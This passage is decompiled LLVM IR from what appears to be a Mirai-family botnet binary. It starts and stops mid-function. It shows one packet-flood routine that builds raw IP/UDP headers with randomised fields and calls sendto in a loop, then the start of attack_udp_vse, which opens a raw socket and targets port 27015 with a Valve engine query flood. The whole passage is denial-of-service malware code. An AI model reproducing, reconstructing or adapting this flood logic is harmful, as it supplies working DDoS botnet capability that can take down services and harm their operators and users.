  %v3_d000 = load i32, i32* @r5, align 4
  %v4_d000 = add i32 %v3_d000, 10
  %v5_d000 = inttoptr i32 %v4_d000 to i16*
  store i16 %v3_cffc, i16* %v5_d000, align 2
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d008 = load i32, i32* @r6, align 4
  %v3_d008 = add i32 %v2_d008, 6
  %v4_d008 = inttoptr i32 %v3_d008 to i16*
  store i16 0, i16* %v4_d008, align 2
  %v0_d00c = load i32, i32* @r6, align 4
  %v1_d00c = add i32 %v0_d00c, 4
  %v2_d00c = inttoptr i32 %v1_d00c to i16*
  %v3_d00c = load i16, i16* %v2_d00c, align 2
  %v4_d00c = zext i16 %v3_d00c to i32
  store i32 %v4_d00c, i32* %r2.global-to-local, align 4
  store i32 %v0_d00c, i32* @r1, align 4
  %v0_d014 = load i32, i32* @sl, align 4
  store i32 %v0_d014, i32* %r3.global-to-local, align 4
  %v0_d018 = load i32, i32* @r5, align 4
  store i32 %v0_d018, i32* %r0.global-to-local, align 4
  %v4_d01c = call i32 @checksum_tcpudp(i32 %v0_d018, i32 %v0_d00c, i32 %v4_d00c, i32 %v0_d014)
  %v5_d01c = trunc i32 %v4_d01c to i16
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v3_d020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d020, i32* %r3.global-to-local, align 4
  %v3_d024 = mul i32 %v3_d020, 32
  store i32 %v3_d024, i32* %lr.global-to-local, align 4
  %v3_d028 = load i32, i32* @r6, align 4
  %v4_d028 = add i32 %v3_d028, 6
  %v5_d028 = inttoptr i32 %v4_d028 to i16*
  store i16 %v5_d01c, i16* %v5_d028, align 2
  %v0_d02c = load i32, i32* %lr.global-to-local, align 4
  %v1_d02c = load i32, i32* %r3.global-to-local, align 4
  %tmp53 = mul i32 %v1_d02c, -8
  %v5_d02c = add i32 %v0_d02c, %tmp53
  store i32 %v5_d02c, i32* %lr.global-to-local, align 4
  %v0_d030 = load i32, i32* @r6, align 4
  %v1_d030 = add i32 %v0_d030, 2
  %v2_d030 = inttoptr i32 %v1_d030 to i16*
  %v3_d030 = load i16, i16* %v2_d030, align 2
  %v4_d030 = zext i16 %v3_d030 to i32
  store i32 %v4_d030, i32* @r6, align 4
  %v1_d034 = load i32, i32* @r7, align 4
  %v2_d034 = add i32 %v1_d034, %v5_d02c
  store i32 %v2_d034, i32* @lr, align 4
  %v3_d038 = add i32 %v2_d034, 2
  %v4_d038 = inttoptr i32 %v3_d038 to i16*
  store i16 %v3_d030, i16* %v4_d038, align 2
  %v0_d03c = load i32, i32* @r8, align 4
  store i32 %v0_d03c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d048 = load i32, i32* @r5, align 4
  store i32 %v0_d048, i32* %r1.global-to-local, align 4
  %v0_d04c = load i32, i32* @fp, align 4
  store i32 %v0_d04c, i32* %r0.global-to-local, align 4
  %v0_d050 = load i32, i32* @lr, align 4
  %v6_d058 = call i32 @__libc_sendto(i32 %v0_d04c, i32 %v0_d048, i32 %v0_d03c, i32 16384, i32 %v0_d050, i32 16)
  %v3_d05c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v1_d064 = add i32 %v3_d05c, 1
  store i32 %v1_d064, i32* %r0.global-to-local, align 4
  store i32 %v1_d064, i32* %stack_var_-44, align 4
  %v6_d070 = icmp slt i32 %v1_d064, %arg2
  br i1 %v6_d070, label %dec_label_pc_d074, label %dec_label_pc_d218

dec_label_pc_d074:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf98
  %v1_d088 = phi i32 [ %v1_d064, %dec_label_pc_cfec ], [ 0, %dec_label_pc_cf98 ]
  %v5_d078 = mul i32 %v1_d088, 24
  %v1_d080 = load i32, i32* @r7, align 4
  %v2_d080 = add i32 %v1_d080, %v5_d078
  store i32 %v2_d080, i32* %r3.global-to-local, align 4
  %v1_d084 = add i32 %v2_d080, 20
  %v2_d084 = inttoptr i32 %v1_d084 to i8*
  %v3_d084 = load i8, i8* %v2_d084, align 1
  %v4_d084 = zext i8 %v3_d084 to i32
  store i32 %v4_d084, i32* %r2.global-to-local, align 4
  %v4_d088 = mul i32 %v1_d088, 4
  %v5_d088 = add i32 %v4_d088, %v2_cca8
  %v6_d088 = inttoptr i32 %v5_d088 to i32*
  %v7_d088 = load i32, i32* %v6_d088, align 4
  store i32 %v7_d088, i32* @r5, align 4
  %v1_d090 = add i32 %v7_d088, 20
  store i32 %v1_d090, i32* @r6, align 4
  %tmp54 = icmp ugt i8 %v3_d084, 31
  br i1 %tmp54, label %dec_label_pc_cfac, label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d074
  %v1_d098 = add i32 %v2_d080, 16
  %v2_d098 = inttoptr i32 %v1_d098 to i32*
  %v3_d098 = load i32, i32* %v2_d098, align 4
  %v0_d09c = call i32 @rand_next()
  store i32 %v0_d09c, i32* %r0.global-to-local, align 4
  %v3_d0a0 = load i32, i32* %stack_var_-44, align 4
  %v5_d0a8 = mul i32 %v3_d0a0, 24
  %v1_d0ac = and i32 %v3_d098, 16711680
  store i32 %v1_d0ac, i32* %ip.global-to-local, align 4
  %v3_d0b0 = udiv i32 %v3_d098, 16777216
  %v4_d0b4 = udiv i32 %v1_d0ac, 256
  %v5_d0b4 = or i32 %v4_d0b4, %v3_d0b0
  store i32 %v5_d0b4, i32* %r2.global-to-local, align 4
  %v1_d0b8 = load i32, i32* @r7, align 4
  %v2_d0b8 = add i32 %v1_d0b8, %v5_d0a8
  store i32 %v2_d0b8, i32* %r1.global-to-local, align 4
  %v1_d0bc = and i32 %v3_d098, 65280
  store i32 %v1_d0bc, i32* %r3.global-to-local, align 4
  %v1_d0c0 = add i32 %v2_d0b8, 20
  %v2_d0c0 = inttoptr i32 %v1_d0c0 to i8*
  %v3_d0c0 = load i8, i8* %v2_d0c0, align 1
  %v4_d0c0 = zext i8 %v3_d0c0 to i32
  store i32 %v4_d0c0, i32* %ip.global-to-local, align 4
  %v5_d0c8 = call i32 @llvm.bswap.i32(i32 %v3_d098)
  %v7_d0cc = lshr i32 %v0_d09c, %v4_d0c0
  %v8_d0cc = add i32 %v7_d0cc, %v5_d0c8
  store i32 %v8_d0cc, i32* %r2.global-to-local, align 4
  %v1_d0d0 = and i32 %v8_d0cc, 16711680
  store i32 %v1_d0d0, i32* %r0.global-to-local, align 4
  %v1_d0dc = and i32 %v8_d0cc, 65280
  store i32 %v1_d0dc, i32* %r1.global-to-local, align 4
  %v5_d0e4 = call i32 @llvm.bswap.i32(i32 %v8_d0cc)
  store i32 %v5_d0e4, i32* %r3.global-to-local, align 4
  %v0_d0e8 = load i32, i32* @sb, align 4
  %v3_d0e8 = icmp eq i32 %v0_d0e8, -1
  %v1_d0ec = load i32, i32* @r5, align 4
  %v2_d0ec = add i32 %v1_d0ec, 16
  %v3_d0ec = inttoptr i32 %v2_d0ec to i32*
  store i32 %v5_d0e4, i32* %v3_d0ec, align 4
  br i1 %v3_d0e8, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_d0f4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  %v0_d0f4 = call i32 @rand_next()
  store i32 %v0_d0f4, i32* %r0.global-to-local, align 4
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  %v1_d108 = load i32, i32* @r5, align 4
  %v2_d108 = add i32 %v1_d108, 12
  %v3_d108 = inttoptr i32 %v2_d108 to i32*
  store i32 %v0_d0f4, i32* %v3_d108, align 4
  br i1 %v9_d104, label %dec_label_pc_d110, label %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge

dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge:    ; preds = %dec_label_pc_d0f4
  %v1_cfcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cfc8

dec_label_pc_d110:                                ; preds = %dec_label_pc_d0f4, %dec_label_pc_cfb4
  %v0_d110 = call i32 @rand_next()
  %v1_d110 = trunc i32 %v0_d110 to i16
  %v3_d114 = load i32, i32* @r5, align 4
  %v4_d114 = add i32 %v3_d114, 4
  %v5_d114 = inttoptr i32 %v4_d114 to i16*
  store i16 %v1_d110, i16* %v5_d114, align 2
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v1_d11c = load i32, i32* @r4, align 4
  %v9_d11c = icmp eq i32 %v3_ce48, %v1_d11c
  br i1 %v9_d11c, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_d124:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v0_d124 = call i32 @rand_next()
  %v1_d124 = trunc i32 %v0_d124 to i16
  store i32 %v0_d124, i32* %r0.global-to-local, align 4
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v1_d12c = load i32, i32* @r4, align 4
  %v9_d12c = icmp eq i32 %v3_ce4c, %v1_d12c
  %v3_d130 = load i32, i32* @r5, align 4
  %v4_d130 = add i32 %v3_d130, 20
  %v5_d130 = inttoptr i32 %v4_d130 to i16*
  store i16 %v1_d124, i16* %v5_d130, align 2
  br i1 %v9_d12c, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_d138:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  %v0_d138 = call i32 @rand_next()
  %v1_d138 = trunc i32 %v0_d138 to i16
  store i32 %v0_d138, i32* %r0.global-to-local, align 4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  %v3_d144 = load i32, i32* @r6, align 4
  %v4_d144 = add i32 %v3_d144, 2
  %v5_d144 = inttoptr i32 %v4_d144 to i16*
  store i16 %v1_d138, i16* %v5_d144, align 2
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138
  %v0_d14c = load i32, i32* @r5, align 4
  %v1_d14c = add i32 %v0_d14c, 28
  store i32 %v1_d14c, i32* @r4, align 4
  store i32 %v1_d14c, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %r1.global-to-local, align 4
  %v2_d158 = call i32 @rand_alphastr(i32 %v1_d14c, i32 %v0_ce28)
  store i32 %v2_d158, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d164 = load i32, i32* @r4, align 4
  %v4_d164 = add i32 %v3_d164, %v0_ce28
  %v5_d164 = inttoptr i32 %v4_d164 to i8*
  store i8 0, i8* %v5_d164, align 1
  br label %dec_label_pc_cfec

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d16c.preheader, %dec_label_pc_d16c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d178 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_d178, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %ip.global-to-local, align 4
  %v3_d180 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d180, i32* %r1.global-to-local, align 4
  %v2_d184 = load i32, i32* @r4, align 4
  %v5_d184 = mul i32 %v2_d184, 4
  %v6_d184 = add i32 %v5_d184, %v2_cca8
  %v7_d184 = inttoptr i32 %v6_d184 to i32*
  store i32 %v2_d178, i32* %v7_d184, align 4
  %v0_d188 = load i32, i32* %ip.global-to-local, align 4
  %v1_d188 = load i32, i32* %r1.global-to-local, align 4
  %v4_d188 = mul i32 %v1_d188, 4
  %v5_d188 = add i32 %v4_d188, %v0_d188
  %v6_d188 = inttoptr i32 %v5_d188 to i32*
  %v7_d188 = load i32, i32* %v6_d188, align 4
  store i32 %v7_d188, i32* %r3.global-to-local, align 4
  %v1_d18c = inttoptr i32 %v7_d188 to i8*
  %v2_d18c = load i8, i8* %v1_d18c, align 1
  %tmp55 = urem i8 %v2_d18c, 16
  %v1_d190 = zext i8 %tmp55 to i32
  %v1_d194 = or i32 %v1_d190, 64
  store i32 %v1_d194, i32* %r2.global-to-local, align 4
  %v1_d198 = trunc i32 %v1_d194 to i8
  store i8 %v1_d198, i8* %v1_d18c, align 1
  %v0_d19c = load i32, i32* %r3.global-to-local, align 4
  %v1_d19c = inttoptr i32 %v0_d19c to i8*
  %v2_d19c = load i8, i8* %v1_d19c, align 1
  %v1_d1a0 = and i8 %v2_d19c, -16
  %v1_d1a4 = or i8 %v1_d1a0, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_d1a4, i8* %v1_d19c, align 1
  %v0_d1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_d1b0 = trunc i32 %v0_d1b0 to i8
  %v2_d1b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b0 = add i32 %v2_d1b0, 9
  %v4_d1b0 = inttoptr i32 %v3_d1b0 to i8*
  store i8 %v1_d1b0, i8* %v4_d1b0, align 1
  %v2_d1b8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b8 = add i32 %v2_d1b8, 1
  %v4_d1b8 = inttoptr i32 %v3_d1b8 to i8*
  store i8 %v5_cce0, i8* %v4_d1b8, align 1
  store i32 %v4_d1bc, i32* %ip.global-to-local, align 4
  %v0_d1c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_d1c0 = mul i32 %v0_d1c0, 32
  store i32 %v3_d1c0, i32* %r0.global-to-local, align 4
  %v2_d1c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1c4 = add i32 %v2_d1c4, 8
  %v4_d1c4 = inttoptr i32 %v3_d1c4 to i8*
  store i8 %v5_cd18, i8* %v4_d1c4, align 1
  %v0_d1c8 = load i32, i32* @sb, align 4
  %v1_d1c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1c8 = add i32 %v1_d1c8, 12
  %v3_d1c8 = inttoptr i32 %v2_d1c8 to i32*
  store i32 %v0_d1c8, i32* %v3_d1c8, align 4
  %v0_d1cc = load i32, i32* %r0.global-to-local, align 4
  %v1_d1cc = load i32, i32* %r1.global-to-local, align 4
  %tmp56 = mul i32 %v1_d1cc, -8
  %v5_d1cc = add i32 %v0_d1cc, %tmp56
  %v1_d1d0 = load i32, i32* @r7, align 4
  %v2_d1d0 = add i32 %v5_d1cc, %v1_d1d0
  store i32 %v2_d1d0, i32* %r2.global-to-local, align 4
  %v1_d1d4 = add i32 %v2_d1d0, 16
  %v2_d1d4 = inttoptr i32 %v1_d1d4 to i32*
  %v3_d1d4 = load i32, i32* %v2_d1d4, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_d1dc = load i32, i32* %r3.global-to-local, align 4
  %v2_d1dc = add i32 %v1_d1dc, 16
  %v3_d1dc = inttoptr i32 %v2_d1dc to i32*
  store i32 %v3_d1d4, i32* %v3_d1dc, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v0_d1e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d1e4 = add i32 %v0_d1e4, 1
  store i32 %v1_d1e4, i32* @r4, align 4
  %v0_d1e8 = load i32, i32* @r6, align 4
  %v1_d1e8 = trunc i32 %v0_d1e8 to i16
  %v2_d1e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1e8 = add i32 %v2_d1e8, 2
  %v4_d1e8 = inttoptr i32 %v3_d1e8 to i16*
  store i16 %v1_d1e8, i16* %v4_d1e8, align 2
  %v0_d1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_d1ec = add i32 %v0_d1ec, 20
  store i32 %v1_d1ec, i32* %r1.global-to-local, align 4
  %v0_d1f0 = load i32, i32* @r8, align 4
  %v1_d1f0 = trunc i32 %v0_d1f0 to i16
  %v3_d1f0 = add i32 %v0_d1ec, 4
  %v4_d1f0 = inttoptr i32 %v3_d1f0 to i16*
  store i16 %v1_d1f0, i16* %v4_d1f0, align 2
  %v0_d1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1f4 = trunc i32 %v0_d1f4 to i16
  %v2_d1f4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f4 = add i32 %v2_d1f4, 6
  %v4_d1f4 = inttoptr i32 %v3_d1f4 to i16*
  store i16 %v1_d1f4, i16* %v4_d1f4, align 2
  %v0_d1f8 = load i32, i32* @sl, align 4
  %v1_d1f8 = trunc i32 %v0_d1f8 to i16
  %v2_d1f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f8 = add i32 %v2_d1f8, 20
  %v4_d1f8 = inttoptr i32 %v3_d1f8 to i16*
  store i16 %v1_d1f8, i16* %v4_d1f8, align 2
  store i32 %v4_d1fc, i32* %r3.global-to-local, align 4
  %v0_d200 = load i32, i32* @r4, align 4
  %v1_d200 = load i32, i32* %r0.global-to-local, align 4
  %v0_d204 = load i32, i32* @r5, align 4
  %v1_d204 = trunc i32 %v0_d204 to i16
  %v2_d204 = load i32, i32* %r1.global-to-local, align 4
  %v3_d204 = add i32 %v2_d204, 4
  %v4_d204 = inttoptr i32 %v3_d204 to i16*
  store i16 %v1_d204, i16* %v4_d204, align 2
  %v0_d208 = load i32, i32* %r3.global-to-local, align 4
  %v1_d208 = trunc i32 %v0_d208 to i16
  %v2_d208 = load i32, i32* %r1.global-to-local, align 4
  %v3_d208 = add i32 %v2_d208, 2
  %v4_d208 = inttoptr i32 %v3_d208 to i16*
  store i16 %v1_d208, i16* %v4_d208, align 2
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %stack_var_-44, align 4
  %v5_d210 = icmp slt i32 %v0_d200, %v1_d200
  br i1 %v5_d210, label %dec_label_pc_d16c, label %dec_label_pc_cf84.preheader

dec_label_pc_d218:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf84
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d21c = call i32 @__GI_time(i32* null)
  store i32 %v2_d21c, i32* %r0.global-to-local, align 4
  store i32 %v2_cdc0, i32* %r3.global-to-local, align 4
  %v6_d228 = icmp slt i32 %v2_cdc0, %v2_d21c
  br i1 %v6_d228, label %dec_label_pc_d22c, label %dec_label_pc_cf84

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d218, %entry, %dec_label_pc_d238
  %v1_d234 = phi i32 [ %v3_cdd4, %entry ], [ %v1_d23c, %dec_label_pc_d238 ], [ %v2_d21c, %dec_label_pc_d218 ]
  store i32 %v27_cc7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_d234

dec_label_pc_d238:                                ; preds = %dec_label_pc_cde4
  %v0_d238 = load i32, i32* @fp, align 4
  store i32 %v0_d238, i32* %r0.global-to-local, align 4
  %v1_d23c = call i32 @__GI___libc_close(i32 %v0_d238)
  store i32 %v1_d23c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d22c

; uselistorder directives
  uselistorder i32 %v1_d23c, { 1, 0 }
  uselistorder i32 %v0_d138, { 1, 0 }
  uselistorder i32 %v0_d124, { 1, 0 }
  uselistorder i32 %v1_d11c, { 1, 0 }
  uselistorder i32 %v5_d0e4, { 1, 0 }
  uselistorder i32 %v3_d098, { 2, 1, 3, 0 }
  uselistorder i32 %v1_d064, { 1, 2, 0, 3 }
  uselistorder i32 %v5_d02c, { 1, 0 }
  uselistorder i32 %v4_d01c, { 1, 0 }
  uselistorder i32 %v0_d00c, { 1, 0, 2 }
  uselistorder i32 %v2_cffc, { 1, 0 }
  uselistorder i1 %v2_d140, { 1, 0 }
  uselistorder i1 %v9_d104, { 1, 0 }
  uselistorder i32 %v1_cf44, { 1, 0 }
  uselistorder i16 %v5_ced4, { 1, 0 }
  uselistorder i32 %v3_cec0, { 1, 0 }
  uselistorder i32 %v3_cebc, { 1, 0 }
  uselistorder i32 %v3_ceb8, { 1, 0 }
  uselistorder i32 %v1_ce78, { 2, 3, 1, 0 }
  uselistorder i32 %v1_ce74, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v3_ce48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_ce44, { 1, 2, 0 }
  uselistorder i32 %v3_ce3c, { 1, 0 }
  uselistorder i32 %v0_ce28, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_cdd4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_cdc0, { 1, 0 }
  uselistorder i32 %v1_cd9c, { 2, 1, 3, 0 }
  uselistorder i32 %v7_cd5c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_cd28, { 1, 0 }
  uselistorder i8 %v5_cd18, { 1, 0, 2 }
  uselistorder i32 %v6_ccfc, { 1, 0 }
  uselistorder i32 %v8_cce4, { 1, 0, 2 }
  uselistorder i32 %v6_ccc0, { 1, 0 }
  uselistorder i32 %v2_cca8, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 8, 3, 4, 5, 6, 7, 10, 9, 12, 11, 14, 15, 13, 17, 16, 19, 18, 20, 22, 21, 29, 23, 24, 25, 26, 27, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32 %arg2, { 2, 5, 4, 6, 0, 3, 1, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_d22c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d16c, { 1, 0 }
  uselistorder label %dec_label_pc_d14c, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf84, { 1, 0 }
  uselistorder label %dec_label_pc_cee0, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d248 = load i32, i32* @r4, align 4
  %v27_d248 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d274 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d278 = load i32, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d280 = load i32, i32* @r7, align 4
  store i32 %v0_d280, i32* %r3.global-to-local, align 4
  store i32 %v2_d274, i32* @sb, align 4
  %v0_d288 = load i32, i32* @r5, align 4
  %v4_d28c = inttoptr i32 %v0_d278 to i32*
  %v5_d28c = call i32 @attack_get_opt_int(i32 %v0_d288, i32* %v4_d28c, i32 2, i32 %v0_d280)
  %v1_d298 = urem i32 %v5_d28c, 256
  store i32 %v1_d298, i32* %ip.global-to-local, align 4
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d2a8 = load i32, i32* @r5, align 4
  %v5_d2ac = trunc i32 %v5_d28c to i8
  %v7_d2b0 = inttoptr i32 %v0_d29c to i32*
  %v8_d2b0 = call i32 @attack_get_opt_int(i32 %v0_d2a8, i32* %v7_d2b0, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_d2b4 = load i32, i32* @r4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r5, align 4
  %v5_d2c8 = inttoptr i32 %v0_d2b4 to i32*
  %v6_d2c8 = call i32 @attack_get_opt_int(i32 %v0_d2c4, i32* %v5_d2c8, i32 4, i32 64)
  %v0_d2d0 = load i32, i32* @r4, align 4
  %v1_d2d4 = urem i32 %v6_d2c8, 256
  store i32 %v1_d2d4, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d2dc = load i32, i32* @r7, align 4
  store i32 %v0_d2dc, i32* %r3.global-to-local, align 4
  %v0_d2e0 = load i32, i32* @r5, align 4
  %v6_d2e8 = inttoptr i32 %v0_d2d0 to i32*
  %v7_d2e8 = call i32 @attack_get_opt_int(i32 %v0_d2e0, i32* %v6_d2e8, i32 5, i32 %v0_d2dc)
  %v1_d2f4 = urem i32 %v7_d2e8, 256
  store i32 %v1_d2f4, i32* %ip.global-to-local, align 4
  %v0_d2f8 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d304 = load i32, i32* @r5, align 4
  %v6_d30c = inttoptr i32 %v0_d2f8 to i32*
  %v7_d30c = call i32 @attack_get_opt_int(i32 %v0_d304, i32* %v6_d30c, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_d314 = load i32, i32* @r4, align 4
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d324 = load i32, i32* @r5, align 4
  %v5_d328 = inttoptr i32 %v0_d314 to i32*
  %v6_d328 = call i32 @attack_get_opt_int(i32 %v0_d324, i32* %v5_d328, i32 7, i32 27015)
  store i32 %v6_d328, i32* @r4, align 4
  %v0_d330 = load i32, i32* @r7, align 4
  store i32 %v0_d330, i32* %stack_var_-48, align 4
  %v1_d338 = inttoptr i32 %v0_d330 to i32*
  %v2_d338 = call i32 @__GI_time(i32* %v1_d338)
  %v1_d33c = load i32, i32* @r6, align 4
  %v2_d33c = add i32 %v1_d33c, %v2_d338
  %v1_d348 = call i32 @table_unlock_val(i32 36)
  %v3_d354 = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d368 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_d36c = icmp eq i32 %v3_d368, -1
  store i32 %v3_d368, i32* @sl, align 4
  br i1 %v7_d36c, label %dec_label_pc_d698, label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d380 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d380, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_d388 = load i32, i32* @r7, align 4
  store i32 %v0_d388, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d394 = call i32 @__GI_setsockopt(i32 %v3_d368, i32 %v0_d388, i32 3, i32 %v6_d380, i32 ptrtoint (i32* @0 to i32))
  %v7_d398 = icmp eq i32 %v5_d394, -1
  br i1 %v7_d398, label %dec_label_pc_d6a4, label %dec_label_pc_d3a0

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d378
  store i32 %v7_d30c, i32* %r2.global-to-local, align 4
  %v0_d3ac = load i32, i32* @r4, align 4
  %v3_d3b0 = mul i32 %v7_d30c, 65536
  store i32 %v3_d3b0, i32* %ip.global-to-local, align 4
  %v3_d3b4 = urem i32 %v8_d2b0, 65536
  store i32 %v3_d3b4, i32* %r3.global-to-local, align 4
  %v3_d3b8 = urem i32 %v7_d30c, 65536
  %v3_d3bc = urem i32 %v0_d3ac, 65536
  %v0_d3c0 = load i32, i32* @fp, align 4
  %v2_d3c0 = icmp eq i32 %v0_d3c0, 0
  %v0_d3c4 = load i32, i32* @r7, align 4
  store i32 %v0_d3c4, i32* %stack_var_-44, align 4
  br i1 %v2_d3c0, label %dec_label_pc_d504.preheader, label %dec_label_pc_d3d8

dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3a0
  %tmp39 = mul i32 %v8_d2b0, 256
  %v3_d3e0 = and i32 %tmp39, 65280
  store i32 %v3_d3e0, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v0_d3ac, 256
  %v3_d3e4 = and i32 %tmp40, 65280
  %tmp41 = udiv i32 %v8_d2b0, 256
  %v4_d3ec = urem i32 %tmp41, 256
  %v5_d3ec = or i32 %v4_d3ec, %tmp39
  %tmp42 = udiv i32 %v0_d3ac, 256
  %v4_d3f0 = urem i32 %tmp42, 256
